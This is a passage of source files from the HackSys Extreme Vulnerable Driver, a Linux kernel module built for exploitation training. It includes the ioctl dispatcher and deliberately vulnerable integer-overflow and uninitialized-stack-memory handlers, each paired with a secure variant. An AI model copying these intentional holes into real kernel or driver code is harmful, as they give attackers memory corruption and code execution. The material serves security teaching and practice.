3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    BufferOverflowStack.h

Abstract:
    This module implements the data structures for
    buffer overflow in Stack module.

--*/

#pragma once

#ifndef __BUFFER_OVERFLOW_STACK_H__
#define __BUFFER_OVERFLOW_STACK_H__

#include "Common.h"


/**
 * Function Definitions
 */

int trigger_buffer_overflow_stack(void *user_buffer, size_t size);

#endif  // !__BUFFER_OVERFLOW_STACK_H__

```

`Driver/HEVD/Linux/CMakeLists.txt`:

```txt
if(SECURE)
    message("Generating secure HEVD build configuration")
else()
    message("Generating vulnerable HEVD build configuration")
endif()


lkm_add_driver(
    NAME
        HEVD
    HackSysExtremeVulnerableDriver.c
    BufferOverflowStack.c
    IntegerOverflow.c
    ArbitraryWrite.c
    UninitializedMemoryStack.c
)

```

`Driver/HEVD/Linux/Common.h`:

```h
/*++

          ##     ## ######## ##     ## ########
          ##     ## ##       ##     ## ##     ##
          ##     ## ##       ##     ## ##     ##
          ######### ######   ##     ## ##     ##
          ##     ## ##        ##   ##  ##     ##
          ##     ## ##         ## ##   ##     ##
          ##     ## ########    ###    ########

            HackSys Extreme Vulnerable Driver

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    Common.h

Abstract:
    This module implements the data structures which
    are common to the driver modules.

--*/

#pragma once

#ifndef __COMMON_H__
#define __COMMON_H__

#include <linux/fs.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/uaccess.h>
#include <linux/miscdevice.h>
#include <linux/uaccess.h>
#include <linux/version.h>

/**
 * Defines
 */

#define BUFFER_SIZE 512

#define STATUS_SUCCESS      0x0

#define _STRINGIFY(value) #value
#define STRINGIFY(value) _STRINGIFY(value)

#define PRINTK(level, fmt, ...) printk(KERN_##level "%s: " fmt, THIS_MODULE->name, ##__VA_ARGS__)

#define ERR(fmt, ...) PRINTK(ERR, fmt, ##__VA_ARGS__)
#define INFO(fmt, ...) PRINTK(INFO, fmt, ##__VA_ARGS__)
#define WARNING(fmt, ...) PRINTK(WARNING, fmt, ##__VA_ARGS__)

#if (LINUX_VERSION_CODE >= KERNEL_VERSION(5,0,0))

#define VERIFY_READ     0
#define VERIFY_WRITE    1
#define x_access_ok(type, addr, size) access_ok(addr, size)

#else /* LINUX_VERSION_CODE < KERNEL_VERSION(5,0,0) */

#define x_access_ok(type, addr, size) access_ok(type, addr, size)

#endif /* LINUX_VERSION_CODE >= KERNEL_VERSION(5,0,0) */

typedef void (*FunctionPointer)(void);


/**
 * Structures
 */

struct hevd_io {
    void *input_buffer;
    size_t input_buffer_length;
    void *output_buffer;
    size_t output_buffer_length;
};


/**
 * Function Definitions
 */

int buffer_overflow_stack_ioctl_handler(struct hevd_io *io);
int integer_overflow_ioctl_handler(struct hevd_io *io);
int arbitrary_write_ioctl_handler(struct hevd_io *io);
int uninitialized_memory_stack_ioctl_handler(struct hevd_io *io);

#endif // !__COMMON_H__

```

`Driver/HEVD/Linux/HackSysExtremeVulnerableDriver.c`:

```c
/*++

          ##     ## ######## ##     ## ########
          ##     ## ##       ##     ## ##     ##
          ##     ## ##       ##     ## ##     ##
          ######### ######   ##     ## ##     ##
          ##     ## ##        ##   ##  ##     ##
          ##     ## ##         ## ##   ##     ##
          ##     ## ########    ###    ########

            HackSys Extreme Vulnerable Driver

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    HackSysExtremeVulnerableDriver.c

Abstract:
    This module implements the main kernel driver
    of HackSys Extreme Vulnerable Driver.

--*/

#include "HackSysExtremeVulnerableDriver.h"

/**
 * File Operations
 */

struct file_operations hevd_fops = {
    .owner = THIS_MODULE,
    .unlocked_ioctl = hevd_ioctl
};

/**
 * Miscellaneous Device
 */

static struct miscdevice hevd_device = {
    .minor = MISC_DYNAMIC_MINOR,
    .name = "HackSysExtremeVulnerableDriver",
    .fops = &hevd_fops
};

/**
 * Driver initialization routine
 *
 * @return status code
 */
static int __init hevd_init(void)
{
    int status = 0;

    /**
     * Register the device
     */

    status = misc_register(&hevd_device);

    if (status < 0)
    {
        ERR("[-] Error Initializing HackSys Extreme Vulnerable Driver\n");
        return status;
    }

    INFO(BANNER);
    INFO("[+] HackSys Extreme Vulnerable Driver Loaded\n");

    return status;
}

/**
 * Driver cleanup routine
 */
static void __exit hevd_exit(void)
{
    /**
     * Deregister the device
     */

    misc_deregister(&hevd_device);

    INFO("[-] HackSys Extreme Vulnerable Driver Unloaded\n");
}

/**
 * Driver IOCTL handler
 */
static long hevd_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
{
    int status = -EINVAL;
    struct hevd_io user_hevd_io = {0};

    if (copy_from_user(&user_hevd_io, (struct hevd_io __user *)arg, sizeof(user_hevd_io)))
    {
        return -EFAULT;
    }

    switch (cmd)
    {
    case HEVD_IOCTL_BUFFER_OVERFLOW_STACK:
        INFO("****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK ******\n");
        status = buffer_overflow_stack_ioctl_handler(&user_hevd_io);
        INFO("****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK ******\n");
        break;
    case HEVD_IOCTL_INTEGER_OVERFLOW:
        INFO("****** HEVD_IOCTL_INTEGER_OVERFLOW ******\n");
        status = integer_overflow_ioctl_handler(&user_hevd_io);
        INFO("****** HEVD_IOCTL_INTEGER_OVERFLOW ******\n");
        break;
    case HEVD_IOCTL_ARBITRARY_WRITE:
        INFO("****** HEVD_IOCTL_ARBITRARY_WRITE ******\n");
        status = arbitrary_write_ioctl_handler(&user_hevd_io);
        INFO("****** HEVD_IOCTL_ARBITRARY_WRITE ******\n");
        break;
    case HEVD_IOCTL_UNINITIALIZED_MEMORY_STACK:
        INFO("****** HEVD_IOCTL_UNINITIALIZED_MEMORY_STACK ******\n");
        status = uninitialized_memory_stack_ioctl_handler(&user_hevd_io);
        INFO("****** HEVD_IOCTL_UNINITIALIZED_MEMORY_STACK ******\n");
        break;
    default:
        WARNING("[-] Invalid IOCTL Code: 0x%X\n", cmd);
        status = -ENOIOCTLCMD;
        break;
    }

    return status;
}

/**
 * Set initialization and cleanup routines
 */

module_init(hevd_init);
module_exit(hevd_exit);

/**
 * Module information
 */

MODULE_VERSION("4.0");
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Ashfaq Ansari (@HackSysTeam)");
MODULE_DESCRIPTION("HackSys Extreme Vulnerable Driver");

```

`Driver/HEVD/Linux/HackSysExtremeVulnerableDriver.h`:

```h
/*++

          ##     ## ######## ##     ## ########
          ##     ## ##       ##     ## ##     ##
          ##     ## ##       ##     ## ##     ##
          ######### ######   ##     ## ##     ##
          ##     ## ##        ##   ##  ##     ##
          ##     ## ##         ## ##   ##     ##
          ##     ## ########    ###    ########

            HackSys Extreme Vulnerable Driver

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    HackSysExtremeVulnerableDriver.h

Abstract:
    This module implements the data structures for main
    driver module.

--*/

#pragma once

#ifndef __HACKSYS_EXTREME_VULNERABLE_DRIVER_H__
#define __HACKSYS_EXTREME_VULNERABLE_DRIVER_H__

#include "Common.h"


/**
 * Defines
 */

#define BANNER \
         "                                        \n" \
         " ##     ## ######## ##     ## ########  \n" \
         " ##     ## ##       ##     ## ##     ## \n" \
         " ##     ## ##       ##     ## ##     ## \n" \
         " ######### ######   ##     ## ##     ## \n" \
         " ##     ## ##        ##   ##  ##     ## \n" \
         " ##     ## ##         ## ##   ##     ## \n" \
         " ##     ## ########    ###    ########  \n" \
         "   HackSys Extreme Vulnerable Driver    \n" \
         "             Version: 4.00              \n"

#define IOCTL(NUM) _IOWR('h', NUM, struct hevd_io)


/**
 * IOCTL Definitions 
 */

#define HEVD_IOCTL_BUFFER_OVERFLOW_STACK                IOCTL(0)
#define HEVD_IOCTL_BUFFER_OVERFLOW_STACK_GS             IOCTL(1)
#define HEVD_IOCTL_ARBITRARY_WRITE                      IOCTL(2)
#define HEVD_IOCTL_BUFFER_OVERFLOW_KERNEL_HEAP          IOCTL(3)
#define HEVD_IOCTL_ALLOCATE_UAF_OBJECT_KERNEL_HEAP      IOCTL(4)
#define HEVD_IOCTL_USE_UAF_OBJECT_KERNEL_HEAP           IOCTL(5)
#define HEVD_IOCTL_FREE_UAF_OBJECT_KERNEL_HEAP          IOCTL(6)
#define HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_KERNEL_HEAP     IOCTL(7)
#define HEVD_IOCTL_TYPE_CONFUSION                       IOCTL(8)
#define HEVD_IOCTL_INTEGER_OVERFLOW                     IOCTL(9)
#define HEVD_IOCTL_NULL_POINTER_DEREFERENCE             IOCTL(0xA)
#define HEVD_IOCTL_UNINITIALIZED_MEMORY_STACK           IOCTL(0xB)
#define HEVD_IOCTL_UNINITIALIZED_MEMORY_KERNEL_HEAP     IOCTL(0xC)
#define HEVD_IOCTL_DOUBLE_FETCH                         IOCTL(0xD)
//#define HEVD_IOCTL_INSECURE_KERNEL_FILE_ACCESS        IOCTL(0x80E)
#define HEVD_IOCTL_MEMORY_DISCLOSURE_KERNEL_HEAP        IOCTL(0xF)
//#define HEVD_IOCTL_BUFFER_OVERFLOW_PAGED_POOL_SESSION IOCTL(0x810)
#define HEVD_IOCTL_WRITE_NULL                           IOCTL(0x11)
//#define HEVD_IOCTL_BUFFER_OVERFLOW_NON_PAGED_POOL_NX             IOCTL(0x812)
//#define HEVD_IOCTL_MEMORY_DISCLOSURE_NON_PAGED_POOL_NX           IOCTL(0x813)
//#define HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL_NX         IOCTL(0x814)
//#define HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL_NX              IOCTL(0x815)
//#define HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL_NX             IOCTL(0x816)
//#define HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL_NX        IOCTL(0x817)
//#define HEVD_IOCTL_CREATE_ARW_HELPER_OBJECT_NON_PAGED_POOL_NX    IOCTL(0x818)
//#define HEVD_IOCTL_SET_ARW_HELPER_OBJECT_NAME_NON_PAGED_POOL_NX  IOCTL(0x819)
//#define HEVD_IOCTL_GET_ARW_HELPER_OBJECT_NAME_NON_PAGED_POOL_NX  IOCTL(0x81A)
//#define HEVD_IOCTL_DELETE_ARW_HELPER_OBJECT_NON_PAGED_POOL_NX    IOCTL(0x81B)


/**
 * Function Definitions
 */

static int __init hevd_init(void);
static void __exit hevd_exit(void);
static long hevd_ioctl(struct file *file, unsigned int cmd, unsigned long arg);

#endif  // !__HACKSYS_EXTREME_VULNERABLE_DRIVER_H__

```

`Driver/HEVD/Linux/IntegerOverflow.c`:

```c
/*++

        ##     ## ######## ##     ## ########
        ##     ## ##       ##     ## ##     ##
        ##     ## ##       ##     ## ##     ##
        ######### ######   ##     ## ##     ##
        ##     ## ##        ##   ##  ##     ##
        ##     ## ##         ## ##   ##     ##
        ##     ## ########    ###    ########

            HackSys Extreme Vulnerable Driver

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    IntegerOverlfow.c

Abstract:
    This module implements the functions to demonstrate
    integer overflow in kernel module

--*/

#include "IntegerOverflow.h"


/**
 * @param[in] user_buffer the pointer to user mode buffer
 * @param[in] size size of the user mode buffer
 * @return status code
 */
int trigger_integer_overflow(void *user_buffer, size_t size)
{
    unsigned long count = 0;
    int status = STATUS_SUCCESS;
    unsigned long kernel_buffer[BUFFER_SIZE] = {0};
    unsigned long kernel_buffer_terminator = 0xBAD0B0B0;
    size_t terminator_size = sizeof(kernel_buffer_terminator);

    INFO("[+] user_buffer: 0x%p\n", user_buffer);
    INFO("[+] user_buffer size: 0x%zX\n", size);
    INFO("[+] kernel_buffer: 0x%p\n", &kernel_buffer);
    INFO("[+] kernel_buffer size: 0x%zX\n", sizeof(kernel_buffer));

#ifdef SECURE
    /**
     * Secure Note: This is secure because the developer is not doing any arithmetic
     * on the user supplied value. Instead, the developer is subtracting the size of
     * UINT i.e. 4 on x86 from the size of KernelBuffer. Hence, integer overflow will
     * not occur and this check will not fail
     */

    if (size > (sizeof(kernel_buffer) - terminator_size))
    {
        ERR("[-] Invalid user buffer size: 0x%zX\n", size);

        status = -EINVAL;
        return status;
    }

#else
    INFO("[+] Triggering Integer Overflow\n");

    /**
     * Vulnerability Note: This is a vanilla Integer Overflow vulnerability because if
     * 'Size' is 0xFFFFFFFF and we do an addition with size of ULONG i.e. 4 on x86, the
     * integer will wrap down and will finally cause this check to fail
     */

    if ((size + terminator_size) > sizeof(kernel_buffer))
    {
        ERR("[-] Invalid user buffer size: 0x%zX\n", size);

        status = -EINVAL;
        return status;
    }
#endif

    while (count < (size / sizeof(unsigned long)))
    {
        unsigned long n;

        if (copy_from_user((void *)&n, user_buffer + count, sizeof(n)))
        {
            status = -EFAULT;
            break;
        }

        if (n == kernel_buffer_terminator)
        {
            break;
        }

        kernel_buffer[count++] = n;
    }

    return status;
}


/**
 * @param[in] io user space buffer
 * @return status code
 */
int integer_overflow_ioctl_handler(struct hevd_io *io)
{
    size_t size = 0;
    void *user_buffer = NULL;
    int status = -EINVAL;

    user_buffer = io->input_buffer;
    size = io->input_buffer_length;

    if (user_buffer)
    {
        status = trigger_integer_overflow(user_buffer, size);
    }

    return status;
}

```

`Driver/HEVD/Linux/IntegerOverflow.h`:

```h
/*++

          ##     ## ######## ##     ## ########
          ##     ## ##       ##     ## ##     ##
          ##     ## ##       ##     ## ##     ##
          ######### ######   ##     ## ##     ##
          ##     ## ##        ##   ##  ##     ##
          ##     ## ##         ## ##   ##     ##
          ##     ## ########    ###    ########

            HackSys Extreme Vulnerable Driver

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    IntegerOverflow.h

Abstract:
    This module implements the data structures for
    integer overflow module.

--*/

#pragma once

#ifndef __INTEGER_OVERFLOW_H__
#define __INTEGER_OVERFLOW_H__

#include "Common.h"

/**
 * Function Definitions
 */

int trigger_integer_overflow(void *user_buffer, size_t size);

#endif

```

`Driver/HEVD/Linux/UninitializedMemoryStack.c`:

```c
/*++

          ##     ## ######## ##     ## ########
          ##     ## ##       ##     ## ##     ##
          ##     ## ##       ##     ## ##     ##
          ######### ######   ##     ## ##     ##
          ##     ## ##        ##   ##  ##     ##
          ##     ## ##         ## ##   ##     ##
          ##     ## ########    ###    ########

            HackSys Extreme Vulnerable Driver

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    UninitializedMemoryStack.c

Abstract:
    This module implements the functions to demonstrate
    use of uninitialized memory in Stack vulnerability.

--*/

#include "UninitializedMemoryStack.h"

/// <summary>
/// Uninitialized Memory Stack Object Callback
/// </summary>
void
UninitializedMemoryStackObjectCallback(void)
{
    INFO("[+] Uninitialized Memory Stack Object Callback\n");
}


/**
 * @param[in] user_buffer the pointer to user mode buffer
 * @param[in] size size of the user mode buffer
 * @return status code
 */
int trigger_uninitialized_memory_stack(void *user_buffer, size_t size)
{
    unsigned long UserValue = 0;
    unsigned long MagicValue = 0xBAD0B0B0;
    int status = STATUS_SUCCESS;

#ifdef SECURE
    //
    // Secure Note: This is secure because the developer is properly initializing
    // UNINITIALIZED_MEMORY_STACK to NULL and checks for NULL pointer before calling
    // the callback
    //

    UNINITIALIZED_MEMORY_STACK UninitializedMemory = { 0 };
#else
    //
    // Vulnerability Note: This is a vanilla Uninitialized Memory in Stack vulnerability
    // because the developer is not initializing 'UNINITIALIZED_MEMORY_STACK' structure
    // before calling the callback when 'MagicValue' does not match 'UserValue'
    //

    UNINITIALIZED_MEMORY_STACK UninitializedMemory;
#endif

    if(copy_from_user(&UserValue, user_buffer, sizeof(UserValue))) {
        ERR("Failed to copy UserValue from user space\n");

        status = -EINVAL;
        return status;
    }

    INFO("[+] UserValue: [0x%p] [0x%zX]\n", &UserValue, UserValue);
    INFO("[+] UninitializedMemory Address: 0x%p\n", &UninitializedMemory);

    if (UserValue == MagicValue) {
        UninitializedMemory.Value = UserValue;
        UninitializedMemory.Callback = &UninitializedMemoryStackObjectCallback;
    }

#ifndef SECURE
    INFO("[+] Triggering Uninitialized Memory in Stack\n");
#endif

    if (UninitializedMemory.Callback) {
        UninitializedMemory.Callback();
    }

    return status;
}


/**
 * @param[in] io user space buffer
 * @return status code
 */
int uninitialized_memory_stack_ioctl_handler(struct hevd_io *io)
{
    size_t size = 0;
    void *user_buffer = NULL;
    int status = -EINVAL;

    user_buffer = io->input_buffer;
    size = io->input_buffer_length;

    if (user_buffer)
    {
        status = trigger_uninitialized_memory_stack(user_buffer, size);
    }

    return status;
}

```

`Driver/HEVD/Linux/UninitializedMemoryStack.h`:

```h
/*++

          ##     ## ######## ##     ## ########
          ##     ## ##       ##     ## ##     ##
          ##     ## ##       ##     ## ##     ##
          ######### ######   ##     ## ##     ##
          ##     ## ##        ##   ##  ##     ##
          ##     ## ##         ## ##   ##     ##
          ##     ## ########    ###    ########

            HackSys Extreme Vulnerable Driver

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    UninitializedMemoryStack.h

Abstract:
    This module implements the data structures for
    uninitialized memory in Stack module.

--*/

#ifndef __UNINITIALIZED_MEMORY_STACK_H__
#define __UNINITIALIZED_MEMORY_STACK_H__

#include "Common.h"


//
// Structures
//

